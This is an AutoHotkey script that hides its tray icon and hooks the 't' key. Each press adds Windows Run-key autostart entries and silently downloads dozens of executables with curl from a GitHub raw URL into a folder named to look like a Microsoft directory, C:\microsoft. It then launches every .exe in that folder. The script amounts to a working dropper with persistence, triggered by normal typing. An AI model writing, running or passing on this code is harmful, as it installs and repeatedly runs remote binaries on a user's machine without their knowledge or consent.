#SingleInstance Ignore
#NoTrayIcon

^Esc::ExitApp

DirList(pattern, attr := "") {
    files := []
    Loop Files pattern, attr {
        files.Push(A_LoopFileFullPath)
    }
    return files
}

SetTimer RunBatch, -1000

RunBatch() {
    static path := "C:\microsoft"
    if !DirExist(path) {
        return
    }
    for file in DirList(path "\*.exe") {
        Run file
    }
}

$t::{
    path := "C:\microsoft"
    Send "t"
    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
    RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"

    static lastRun := 0
    delay := 10000
    now := A_TickCount
    if (now - lastRun < delay) {
        return
    }

    if (DirExist(path)) {
        SetTimer RunBatch, -1000
    } else {
        DirCreate(path)
        letters := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "LButton", "RButton", "Delete", "Backspace", "Space"]
        for letter in letters {
            output := path "\" letter ".exe"
            if !FileExist(output) {
                url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
                command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
                RunWait command, , "Hide"
            }
        }
        SetTimer RunBatch, -1000
    }
}
